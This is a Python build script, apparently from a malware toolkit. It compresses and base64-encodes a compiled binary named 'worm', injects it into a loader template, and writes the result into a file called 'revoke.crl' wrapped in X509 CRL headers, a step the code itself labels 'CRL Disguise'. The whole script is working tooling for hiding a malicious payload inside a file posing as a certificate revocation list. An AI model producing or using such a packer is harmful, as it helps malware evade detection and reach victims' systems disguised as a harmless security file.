import base64
import zlib

def build():
    print("[*] Reading C Binary...")
    try:
        with open("worm", "rb") as f:
            binary_bytes = f.read()
    except FileNotFoundError:
        print("[-] Missing 'worm' binary.")
        return
    
    original_size = len(binary_bytes)

    # 1. Compress (Zlib)
    compressed_data = zlib.compress(binary_bytes, level=9)
    
    # 2. Encode to Base64
    b64_payload = base64.b64encode(compressed_data).decode('utf-8')

    final_size = len(b64_payload)
    print(f"[*] Original Size: {original_size} bytes")
    print(f"[*] Final Payload Size: {final_size} bytes")
    print(f"[*] Reduction: {100 - (final_size/original_size*100):.2f}%")

    # 3. Read Template
    with open("loader-template.py", "r") as f:
        template = f.read()

    # 4. Inject
    final_script = template.replace('REPLACE_ME_WITH_B64_BINARY', b64_payload)

    # 5. CRL Disguise
    script_b64 = base64.b64encode(final_script.encode('utf-8')).decode('utf-8')

    with open("revoke.crl", "w") as f:
        f.write("-----BEGIN X509 CRL-----\n")
        f.write(script_b64)
        f.write("\n-----END X509 CRL-----")

    print("[+] Generated 'revoke.crl'")

if __name__ == "__main__":
    build()